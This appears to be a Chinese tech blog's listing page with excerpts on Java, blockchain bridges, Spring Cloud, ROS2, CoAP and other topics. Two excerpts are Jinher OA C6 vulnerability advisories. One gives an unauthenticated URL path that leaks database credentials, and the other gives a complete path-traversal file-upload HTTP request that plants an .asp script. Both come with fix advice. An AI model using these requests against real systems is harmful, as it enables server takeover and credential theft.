方法一：使用异常 我们可以通过在Lambda表达式中抛出自定义异常的方式，来模拟提前终止forEach的效果。以下是实现这一方法的示例代码：
package com.lfsun.lambda.foreach; import java.util.Arrays; import java.util.List; public class ForEachWithException { public static class BreakIterationException extends RuntimeException { } public static void main(String[] args) { List&lt;String&gt; items = Arrays.asList("A", "B", "C", "D", "E"); try { items.forEach(item -&gt; { if ("C".equals(item)) { throw new BreakIterationException(); } System.out.println(item); }); } catch (BreakIterationException e) { // 捕获异常，提前终止 System.out.println("捕获异常，提前终止"); } } } 在这个例子中，当元素等于"C"时，我们抛出了自定义的BreakIterationException异常，然后在外部通过捕获这个异常来实现提前终止的效果。
方法二：使用自定义标志 另一种方法是使用一个自定义的标志来控制forEach的执行。我们可以在Lambda表达式中检查这个标志，当标志为真时提前终止。以下是实现这一方法的示例代码：
package com.lfsun.lambda.foreach; import java.util.Arrays; import java.util.List; public class ForEachWithFlag { public static void main(String[] args) { List&lt;String&gt; items = Arrays.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9c19692fbecfe4093a4d71b5fa81c8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b2b208c8b2b6dac8bbabd5c543952fa/" rel="bookmark">
			什么是跨链桥？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在过去的几年里，许多新的支持智能合约的公共区块链已经上线，这就产生了加密货币领域跨链互操作性的需求。目前，该领域的开发人员正在努力构建跨链架构，以促进不同区块链之间的通信。 在本文中，我们将解释什么是跨链桥、它们如何工作，并列出最流行的桥。 什么是跨链桥？
跨链桥，也称为区块链桥，是连接独立区块链网络的基础设施协议，允许数字资产从一个区块链无缝转移到另一个区块链，从而增强互操作性。 区块链生态系统正日益变得多链，dApp 在许多不同的区块链网络上运行，每个网络都有独特的信任和安全方法。 然而，这种发展给整个生态系统带来了问题。由于原生区块链不是为直接跨链通信而构建的，因此资产和流动性被孤立并因此分散。 例如，您不能在以太坊网络上使用本机比特币（BTC），反之，您也不能在比特币网络上使用本机以太币（ ETH ）。因此，两个生态系统的用户都是孤立运行的，无法在链上相互通信。 为了使区块链空间演变成多区块链生态系统，互操作性是关键。此前，许多用户满足于使用以太坊进行 dApp，使用比特币进行货币交易。但是，直到今天，这些先驱网络仍受到可扩展性问题的困扰，这使得它们成本高昂且效率低下。
创建第 1 层和第 2 层链等新协议是为了提供较低的交易费用和更高的网络吞吐量。虽然这些新的替代区块链或第二层解决方案具有可扩展性和快速性，但它们仍然无法进行跨链通信，这意味着资产无法轻松地从一层移植到另一层。
通常，将资产从以太坊等区块链网络发送到 Polygon、Optimism 或 Arbitrum 等第 2 层协议涉及许多复杂的步骤，并且依赖加密货币交易所作为中介。
这个难题的解决方案是跨链消息传递协议，它使智能合约能够在区块链网络之间读取、写入和传输数据。 跨链互操作性解决方案对于建立可以来回移动数据和代币的区块链互连网络至关重要。 跨链桥如何工作？
跨链桥接通常涉及通过智能合约锁定或销毁原链上的加密资产，并在新链上解锁或铸造加密资产。后一部分也由智能合约处理。 换句话说，大多数跨链桥的运作方式是将代币“包装”在智能合约中，并在其他链上发行。 一个典型的例子是 Wrapped Bitcoin ( WBTC )，这是一种使用比特币作为抵押的 ERC-20 代币。为了在以太坊网络上接收 WBTC，比特币必须首先锁定在比特币网络上，然后使用跨链桥在以太坊网络上创建。就 WBTC 而言，这个跨链桥是由一家中心化公司运营的，这意味着锁定在比特币网络中的 BTC 由一家名为 BitGo 的托管机构持有。
每个区块链桥有三种不同的类型：
销毁和铸造 —— 用户在原先的链上销毁加密资产，并在新链上铸造相同的资产。
锁定和铸造 —— 用户将加密资产锁定在一条链上的智能合约中，同时，包装的代币将作为IOU在另一条链上铸造。相反，目标链上的包装代币将被烧毁，以解锁第一条链上的原始资产。
锁定和解锁 —— 用户将加密资产锁定在第一条链上，然后在新链上的流动性池中解锁相同的资产。
区块链桥还可以拥有任意数据消息传递功能，以实现区块链之间的信息共享。它们被称为可编程代币桥，它们支持更复杂的跨链功能，例如在新链上的智能合约中交换、质押、借贷或存入代币，同时执行桥接功能。
流行的区块链桥列表
跨链桥梁对于提高加密货币领域的互操作性和整体流动性至关重要。一些最受欢迎的跨链桥包括：
虫洞 （Wormhole） Wormhole是一种跨链消息传递协议，可促进多个链之间的通信，包括 Solana (SOL)、以太坊 (ETH)、Terra (UST)、Avalanche (AVAX)、Polygon (MATIC)、币安智能链 (BSC) 等更多的。虫洞可以实现源链上信息和资产的跨链传输。该信息在转发到目标区块链之前由节点网络进行验证。 多边形桥 Polygon Bridge是一个跨链协议，可实现 Polygon 和以太坊之间的资产转移。用户可以通过 Polygon (POS) 桥或 Plasma 桥这两种跨桥解决方案将 ERC-20 代币和以太坊 NFT 转移到 Polygon 第 2 层链上。 这两个桥都可以将加密资产从以太坊网络移植到 Polygon，但不同之处在于 POS 桥使用权益证明 (PoS) 来保护其网络并支持 ETH 和 ERC 代币的传输。另一方面，Plasma Bridge 采用以太坊 Plasma 扩容解决方案，支持以太坊 (ETH)、ERC-20 代币、ERC-721 代币和 Polygon (MATIC) 的转账。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b2b208c8b2b6dac8bbabd5c543952fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e5964c6bfde153527cbd58df206aa8cd/" rel="bookmark">
			(一)Spring Cloud 直击微服务作用、架构应用、hystrix降级
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		直击微服务作用 微服务架构: 遇到了什么问题?
将单体架构拆分成微服务架构后,如果保证多个服务(项目)正常运行?
哪个技术可以解决这个问题?
微服务技术
服务治理: 服务管理,维护服务与服务之间的关系
这个技术如何使用?
netflix/网飞:
SpringCloud: ★
Alibaba: ★ 软件架构 架构: 结构 软件架构: 软件的结构 淘宝架构演进过程： 100并发 -&gt; 千万并发，阿里淘宝的 14 次架构演进之路！
软件架构演进过程:
单体架构: All in one
优点: 架构简单 部署方便
缺点: 耦合度高,维护成本大
技术栈受限
使用场景: 用户量小,一般情况下开发学生管理系统
分布式架构:
将大项目拆分成多个小项目
微服务架构:
拆分原则:
单一职责: 一个服务只做一件事情(不允许出现冗余的功能或模块)
自治: 团队独立,技术独立,部署独立,数据库独立
面向服务: 微服务开发完毕后,需要对外提供统一的访问接口(对接规范)
隔离性强: 服务调用做好隔离、容错、降级，避免出现级联问题
微服务技术:
各个公司将自己的单体架构的项目拆分成微服务架构项目后,都有自己的解决方案.我们学习时,主要学习SpringCloud官方提供的微服务组件,SpringCloud官方使用的组件主要来自NetFlix和Alibaba
学习微服务其实就是学习相关的微服务组件,一个组件可以解决微服务拆分后的一类问题. 如何使用： 准备微服务环境
创建两个数据库,分别写一套对应的增删改查操作
依赖
&lt;dependency&gt;
&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
&lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;
&lt;version&gt;Hoxton.SR10&lt;/version&gt;
&lt;type&gt;pom&lt;/type&gt;
&lt;scope&gt;import&lt;/scope&gt;
&lt;/dependency&gt; Eureka组件 遇到了什么问题?
- order-service在发起远程调用的时候，该如何得知user-service实例的ip地址和端口？
- 有多个user-service实例地址，order-service调用时该如何选择？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e5964c6bfde153527cbd58df206aa8cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ab5db35f70dfd0e05582f425072fc56/" rel="bookmark">
			Ubuntu20.04安装ROS2 Foxy
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu20.04安装ROS2 Foxy 实操安装 安装ROS2的教程在网上很多，但是我操作之后都有问题，大部分的问题是在 sudo apt update 时访问packages.ros.org无法成功，主要的原因是没有外网，而自己整一个外网代理又非常麻烦，所以一般是通过设置国内源来实现
设置sources.list为国内源
修改 /etc/apt/sources.list里面的源为国内的
sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak sudo vim /etc/apt/sources.list 如清华大学的源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu-ports/ 注意：一定要选择跟自己ubuntu版本匹配的源，我的是ubuntu20.04，对应的源是：
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ focal-backports main restricted universe multiverse deb http://ports.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ab5db35f70dfd0e05582f425072fc56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/280ab23fe2f494ff3a0e55c5fe82c869/" rel="bookmark">
			物联网协议Coap中Californium CoapClient解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、CoapClient对象
1、类定义
2、Client方法调用
二、发送请求
1、构建请求
2、发起请求
3、接收响应
总结
前言 在之前的博客中物联网协议Coap之Californium CoapServer解析，文中简单介绍了CoapServer的实现。在物联网开发环境中，除了Server端需要定义，很多的开发场景是在客户端的开发，这涉及设备端的交互，比如传感器的数据采集，需要通过Client的put方法进行采集数据的提交，同时通过get方法获取服务器端的指令，然后在Client端进行采集。
本次我们简单来看看CoapClient的具体实现，博文将继续采用面向对象分析的方法，结合类图、实际代码、时序图来讲讲解CoapClient类，方便了解和掌握其相关的配置，同时掌握其运行原理。在实际的终端开发中有的放矢。行文仓促，定有不当之处，欢迎各位读者批评指正，再此感谢。
一、CoapClient对象 在Coap的世界中，并不是像http协议一样，只要是浏览器就能发http请求，Coap需要实现对应的CoapClient，以此来跟Server建立通讯，实现数数据的提交，服务的交互。
1、类定义 在CoapClient的构造方法中，有三种构造的方式：
/** * Constructs a new CoapClient that sends requests to the specified URI. * * @param uri the uri */ public CoapClient(String uri) { this.uri = uri; } /** * Constructs a new CoapClient that sends request to the specified URI. * * @param uri the uri */ public CoapClient(URI uri) { this(uri.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/280ab23fe2f494ff3a0e55c5fe82c869/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/805c83f52d35bfd456cddde00b0df543/" rel="bookmark">
			【以题代复习】计算机网络 第二章
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		物理层 一、选择题 1．在数据通信中，将数字信号变换为模拟信号的过程称为（ D ）。
A．编码 B．解码
C．解调 D．调制
2．下列哪一个信号发送不需编码？（C）
A．数字数据模拟信号发送 B．数字数据数字信号发送
C．模拟数据模拟信号发送 D．模拟数据数字信号发送
不需要01数字的不需要编码
3．在以下几种传输媒体中，（A）的传输速率最高。
A．光纤 B．同轴电缆
C．双绞线 D．通信卫星
4．数据通信中，数据传输速率（比特率，bps）是指每秒钟发送的（B）。
A．码元数 B．二进制位数
C．字节数 D．符号数
5．通信的调制技术中，脉冲数字调制技术指的是（A）。
A．由模拟数据转换成数字信号
B．由数字信号转换成模拟数据
C．由数字数据转换成数字信号
D．以上都不是
6．双绞线绞合的目的是（C）。
A．提高传送速度 B．增大抗拉强度
C．减少干扰 D．增大传输距离
7．在OSI参考模型中，物理层存在四个特性。其中有关标准连接器插针的数量的内容属于（D）
A．规程特性 B．电气特性
C．功能特性 D．机械特性
8．在分组交换网中，物理层接收或发送信息的基本单位是（A）。
A．比特 B．字节 C．帧 D．分组
9．在OSI参考模型中，物理层存在四个特性。其中描述线路上数据的传输速率的内容属于（B）。
A．规程特性 B．电气特性 C．功能特性 D．机械特性
10. 计算机网络通信采用同步和异步两种方式，但传送效率最高的是（ A ）。
A．同步方式 B．异步方式
C．同步与异步方式传送效率相同 D.无法比较
11. 承载信息量的基本信号单位是（ A ）。
A. 码元 B.比特 C.数据传输速率 D.误码率
注意是信号单位
12. 计算机与打印机之间的通信属于（ A ）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/805c83f52d35bfd456cddde00b0df543/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7eb5661a79ad2548c03d65c7b49c87e/" rel="bookmark">
			vue3-admin-element框架实现动态路由（根据接口返回）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步：在src-utils-handleRoutes，修改代码：
export function convertRouter(routers) { let array = []; for (let i in routers) { for (let s in asyncRoutes) { if (routers[i].path == asyncRoutes[s].path) { array.push({ ...asyncRoutes[s] }); if (s != 0) array[s].children = []; for (let o in routers[i].children) { for (let p in asyncRoutes[s].children) { if ( routers[i].children[o].path == asyncRoutes[s].children[p].path &amp;&amp; routers[i].children[o].path != '/index' ) { array[s].children.push(asyncRoutes[s].children[p]); } } } } } } return array; } 第二步登录后存储菜单数据：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7eb5661a79ad2548c03d65c7b49c87e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/068b96ae9eea18d2a17578a8686423e5/" rel="bookmark">
			Node.js&#43;Express&#43;Mysql 实现用户密码MD5加密及验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装加密组件
npm install crypto-js 加密算法
let password = CryptoJS.MD5('123456').toString(); 创建用户代码
router.post('/api/user/add', async (req, res) =&gt; { let status = 1; let password = "123456"; password = CryptoJS.MD5(password).toString(); let sqlStr = 'INSERT into sys_user(id, username, realname, phone, password, status) VALUES (?,?,?,?,?,?);' let id = sysUtils.getNewId(); let result = query(sqlStr, [id, req.body.username, req.body.realname, req.body.phone, password, status]); if (req.body.userRoles != null) { sqlStr = 'delete from sys_user_role where user_id = ?'; await query(sqlStr, [id]); req.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/068b96ae9eea18d2a17578a8686423e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97cb3a39e7aa877e651e8b504d3072ed/" rel="bookmark">
			HTML 使用 ruby 给汉字加拼音
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 ruby 给汉字加拼音 兼容性 使用 ruby 给汉字加拼音 大家有没有遇到过要给汉字头顶上加拼音的需求? 如果有的话, 你是怎么解决的呢? 如果费尽心思, 那么你可能走了很多弯路, 因为 HTML 原生就有这样的标签来帮我们实现类似的需求.
&lt;ruby&gt; ruby 本身是「红宝石」的意思, 与题无关
&lt;ruby&gt; 元素是可以渲染在基本文字上、下或旁边的小注释, 通常用来显示东亚文字(CJK, Chinese Japanese and Korean)的发音.
先一睹为快效果
&lt;body&gt; 真理使人 &lt;ruby&gt; 自 &lt;rp&gt;(&lt;/rp&gt;&lt;rt&gt;zì&lt;/rt&gt;&lt;rp&gt;)&lt;/rp&gt; &lt;/ruby&gt; &lt;ruby&gt; 由 &lt;rp&gt;(&lt;/rp&gt;&lt;rt&gt;yóu&lt;/rt&gt;&lt;rp&gt;)&lt;/rp&gt; &lt;/ruby&gt; . &lt;/body&gt; 哇😍, 效果是不是很赞! 没错, 使用起来就是折磨简单, 不过除了 &lt;ruby&gt; 外, 我们还用到了很多其他元素, 下面就一一来介绍
这里多说一句, 即便是不同的书写方向, &lt;ruby&gt; 仍然可以很好的适应. 比如我们将书写顺序改为垂直书写.
&lt;rp&gt; The Ruby Fallback Parenthesis element, Parenthesis 是圆括号的意思
&lt;rp&gt; 元素用来为不支持 &lt;ruby&gt; 显示的浏览器提供兜底的括号.
每一组 &lt;rp&gt;&lt;/rp&gt; 应该分别将开始和结束圆括号括起来, 这对圆括号再将 &lt;rt&gt; 元素括起来, 而最终拼音是在 &lt;rt&gt; 元素中.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97cb3a39e7aa877e651e8b504d3072ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74c96f08b7bc38d0fe1dc462c1cd482f/" rel="bookmark">
			机器人开发--动力系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器人开发--动力系统 1 介绍概述BMS电池管理芯片系电源管理细分赛道，主要产品形态包括电池计量（电量计）、电池安全、充电管理等三大类芯片BMS 产业链动力电源、消费电子细分领域 BMS 芯片种类、技术及下游销量概览 电池电池包典型产品及参数概览电池分类电池 pack 产业链电池管理系统细分功能模块电源管理芯片、电池管理芯片分类三种电池管理芯片典型产品功能拆分TI 典型电池包电量计系统框图充电管理芯片的环路控制典型的锂离子电池充电曲线动力电池 Cell、Module、Pack 定义锂电池使用范围受限电池状态估计概览【SOC、SOH、SOP】BMS 主动均衡和被动均衡比较BMS 精度要求ADI 典型 12 节 BMIC-AFE 芯片电路图（芯片型号 MAX17843）BMS 芯片部分厂商产品及价格（截至 2022 年 3 月） 充电桩 AGV行业厂家电池充电桩 2 电池AGV行业电池功能需求1. 高能量密度2. 快速充电3. 长寿命4. 适应环境5. 可靠性 低温环境对电池的影响1. 降低能量输出2. 增加内阻3. 缩短寿命 几种低温环境的电池低温下使用电池的建议 3 BMS子系统1. 保护IC（Protection Integrated Circuit）2. 电压检测IC（Voltage Detection Integrated Circuit）3. 电流检测电阻（Current Sensing Resistor）4. 温度传感器（Temperature Sensor）5. 逆变器（Inverter）和开关管（Switching Transistor） AGV行业BMS功能需求准确估测动力电池组的荷电状态 (State of Charge，即SOC)，即电池剩余电量单体电池间的均衡多通信方式【can、485】可定制充放同口、充放异口保护功能【过充、过放、短路和过热】 4 充电桩AGV行业充电桩功能需求多通信方式【CAN、RS485、WiFi等】保护功能【开路、过流、过热、短路、连接异常】 AGV充电桩厂商AGV充电系统相关模块刷块史陶比尔充电连接器 参考 1 介绍 概述 BMS 电池管理系统（BMS）主要功能是实现电池单元的智能化管理及维护，通过状态监测、异常故障保护等方法，监管电池状态，延长电池使用寿命，已在各类电子电气设备中得到广泛应用。BMS 系统涉及算法、硬件电路、软件等，该领域长期被 TI、ADI 等国际模拟龙头垄断，市场空间广阔。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74c96f08b7bc38d0fe1dc462c1cd482f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c7dad151fa2a042413e242b05a33f3b/" rel="bookmark">
			金和OA C6 SAP_B1Config.aspx 未授权漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品介绍 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。
漏洞描述 金和OA C6 SAP_B1Config.aspx接口 未授权，攻击者可通过此漏洞获取数据库账户密码等敏感信息。
资产测绘 app=“Jinher-OA”
漏洞复现 POC：
/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 修复建议 1、升级至最新安全版本。
2、限制接口访问。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9738ec86e9d108c7108b819ab586bfb7/" rel="bookmark">
			设计模式之外观模式【结构型模式】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档&gt; 学习的最大理由是想摆脱平庸，早一天就多一份人生的精彩；迟一天就多一天平庸的困扰。各位小伙伴，如果您：
想系统/深入学习某技术知识点…
一个人摸索学习很难坚持，想组团高效学习…
想写博客但无从下手，急需写作干货注入能量…
热爱写作，愿意让自己成为更好的人…
文章目录 前言一、概述二、结构三、案例四、使用场景五、源码解析总结 前言 一、概述
二、结构
三、案例
四、使用场景
五、源码解析
一、概述 有些人可能炒过股票，但其实大部分人都不太懂，这种没有足够了解证券知识的情况下做股票是很容易亏钱的，刚开始炒股肯定都会想，如果有个懂行的帮帮手就好，其实基金就是个好帮手，支付宝里就有许多的基金，它将投资者分散的资金集中起来，交由专业的经理人进行管理，投资于股票、债券、外汇等领域，而基金投资的收益归持有者所有，管理机构收取一定比例的托管管理费用。
定义：
​ 又名门面模式，是一种通过为多个复杂的子系统提供一个一致的接口，而使这些子系统更加容易被访问的模式。该模式对外有一个统一接口，外部应用程序不用关心内部子系统的具体的细节，这样会大大降低应用程序的复杂度，提高了程序的可维护性。
​ 外观（Facade）模式是“迪米特法则”的典型应用
二、结构 外观（Facade）模式包含以下主要角色：
外观（Facade）角色：为多个子系统对外提供一个共同的接口。子系统（Sub System）角色：实现系统的部分功能，客户可以通过外观角色访问它。 三、案例 【例】智能家电控制
小明的爷爷已经60岁了，一个人在家生活：每次都需要打开灯、打开电视、打开空调；睡觉时关闭灯、关闭电视、关闭空调；操作起来都比较麻烦。所以小明给爷爷买了智能音箱，可以通过语音直接控制这些智能家电的开启和关闭。类图如下：
代码如下：
//灯类 public class Light { public void on() { System.out.println("打开了灯...."); } public void off() { System.out.println("关闭了灯...."); } } //电视类 public class TV { public void on() { System.out.println("打开了电视...."); } public void off() { System.out.println("关闭了电视...."); } } //控制类 public class AirCondition { public void on() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9738ec86e9d108c7108b819ab586bfb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea4814ea73f1e1bacba5bfdd4ce725a9/" rel="bookmark">
			金和OA C6 UploadFileEditorSave.aspx 任意文件上传漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		产品介绍 金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。
漏洞概述 金和 OA C6 uploadfileeditorsave接口处存在任意文件上传漏洞，攻击者可以通过构造特殊请求包上传恶意后门文件，从而获取服务器权限。
资产测绘 app=“Jinher-OA”
漏洞复现 POC如下：
POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\ilra9c2tw2.asp HTTP/1.1 Host: your_ip User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Connection: close Content-Length: 187 Content-Type: multipart/form-data; boundary=----umvtqrw8etdtcatpd8vq Accept-Encoding: gzip, deflate, br ------umvtqrw8etdtcatpd8vq Content-Disposition: form-data; name="file"; filename="ilra9c2tw2.jpg" Content-Type: image/png &lt;% response.write(333*2)%&gt; ------umvtqrw8etdtcatpd8vq-- 访问上传文件
修复建议 1、升级到安全版本
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9157f1f843fdd29b8e3f94108adf2051/" rel="bookmark">
			让人头痛事务问题到底要如何解决？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 正好前段时间我在公司处理过这个问题，我们当时由于项目初期时间比较紧张，为了快速完成业务功能，忽略了系统部分性能问题。项目顺利上线后，专门抽了一个迭代的时间去解决大事务问题，目前已经优化完成，并且顺利上线。现给大家总结了一下，我们当时使用的一些解决办法，以便大家被相同问题困扰时，可以参考一下。
大事务引发的问题 在分享解决办法之前，先看看系统中如果出现大事务可能会引发哪些问题
从上图可以看出如果系统中出现大事务时，问题还不小，所以我们在实际项目开发中应该尽量避免大事务的情况。如果我们已有系统中存在大事务问题，该如何解决呢？
解决办法 少用@Transactional注解 大家在实际项目开发中，我们在业务方法加上@Transactional注解开启事务功能，这是非常普遍的做法，它被称为声明式事务。
部分代码如下：
@Transactional(rollbackFor=Exception.class) public void save(User user) { doSameThing... } 然而，我要说的第一条是：少用@Transactional注解。
为什么？
我们知道@Transactional注解是通过spring的aop起作用的，但是如果使用不当，事务功能可能会失效。如果恰巧你经验不足，这种问题不太好排查。至于事务哪些情况下会失效。
@Transactional注解一般加在某个业务方法上，会导致整个业务方法都在同一个事务中，粒度太粗，不好控制事务范围，是出现大事务问题的最常见的原因。
那我们该怎么办呢？
可以使用编程式事务，在spring项目中使用TransactionTemplate类的对象，手动执行事务。
部分代码如下：
@Autowired private TransactionTemplate transactionTemplate; ... public void save(final User user) { transactionTemplate.execute((status) =&gt; { doSameThing... return Boolean.TRUE; }) } 从上面的代码中可以看出，使用TransactionTemplate的编程式事务功能自己灵活控制事务的范围，是避免大事务问题的首选办法。
当然，我说少使用@Transactional注解开启事务，并不是说一定不能用它，如果项目中有些业务逻辑比较简单，而且不经常变动，使用@Transactional注解开启事务开启事务也无妨，因为它更简单，开发效率更高，但是千万要小心事务失效的问题。
将查询(select)方法放到事务外 如果出现大事务，可以将查询(select)方法放到事务外，也是比较常用的做法，因为一般情况下这类方法是不需要事务的。
比如出现如下代码：
@Transactional(rollbackFor=Exception.class) public void save(User user) { queryData1(); queryData2(); addData1(); updateData2(); } 可以将queryData1和queryData2两个查询方法放在事务外执行，将真正需要事务执行的代码才放到事务中，比如：addData1和updateData2方法，这样就能有效的减少事务的粒度。
如果使用TransactionTemplate的编程式事务这里就非常好修改。
@Autowired private TransactionTemplate transactionTemplate; ... public void save(final User user) { queryData1(); queryData2(); transactionTemplate.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9157f1f843fdd29b8e3f94108adf2051/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dcc898e53b2cdd1afbf04fc43b6f80cc/" rel="bookmark">
			网络调试 TCP，开发板用静态地址-入门7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用两台电脑（无线网络）做实验
1.1, 在电脑A上设置为Server如下： 选择TCP Server后，直接跳出用本机IP做为“本地主机地址”
1.2在 电脑B上设置为Client, 远程主机地址设置为Server的 IP
1.3, 在A, B两台电脑上能够互相发送数据
用开发板做实验
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/036f5e5be1edeeeb7e787c7cb3308eae/" rel="bookmark">
			Android System crash DeadSystemException
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 原因： Android System crash DeadSystemException(Service/Activity/终极解决方案)-CSDN博客
遇到的具体情况：
Android系统问题及日志分析_deadsystemexception: the system died; earlier logs-CSDN博客 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5bbaf33c6d0f717a7e92fbd60fabdbe/" rel="bookmark">
			运维工程师在日常工作中频繁运用的10款工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		运维工程师在日常工作中频繁运用的10款工具，并细致阐述每款工具的功能、适用场景以及其卓越之处。
1. Shell脚本：
功能：主要用于自动化任务和批处理作业。
适用场景：频繁用于文件处理、系统管理、简单的网络管理等操作。
优势：灵活且强大，能够直接与系统进行交互操作。
实例：运维工程师常常使用Shell脚本来批量修改服务器上的配置文件。
#!/bin/bash # 配置文件的路径 config_path="/path/to/config/file" # 要修改的内容和新内容 old_content="old_value" new_content="new_value" # 遍历服务器上的配置文件 for file in $(find $config_path -name "*.conf"); do # 判断文件是否包含要修改的内容 if grep -q "$old_content" "$file"; then # 修改文件内容 sed -i "s/$old_content/$new_content/g" "$file" echo "已修改文件: $file" else echo "文件 $file 不包含要修改的内容." fi done 2. Git：
功能：专注于版本控制特性。
适用场景：对代码和配置文件进行版本管理。
优势：包括分支管理、代码回滚以及团队协作功能。
实例：运维工程师常利用Git来管理Puppet或Ansible的代码。
3. Ansible：
功能：提供自动化配置、部署以及管理解决方案。
适用场景：适用于自动化服务器配置、应用部署及监控等领域。
优势：易于学习掌握、具备代理无关性，同时具备强大的模块支持功能。微信搜索公众号：架构师指南，回复：架构师 领取资料 。
实例：运维工程师通常用Ansible来批量配置服务器的防火墙规则。
使用Ansible来配置服务器的防火墙规则：
安装Ansible: 首先，需要在你的本地机器上安装Ansible。你可以通过pip进行安装：pip install ansible。 配置Inventory: 在Ansible中，你需要定义一个inventory文件，这个文件列出了你想要配置的所有服务器。例如，你可以创建一个文件，叫做hosts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5bbaf33c6d0f717a7e92fbd60fabdbe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aebd810ef0331315617f7044a1c96e44/" rel="bookmark">
			缓冲和缓存的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		缓存（Cache）和缓冲（Buffer）都是计算机系统中用于提高性能、优化数据处理的技术，它们虽然有相似之处，但在应用场景和目标上有明显的区别。下面通过具体例子来进一步解释：
缓存（Cache）：
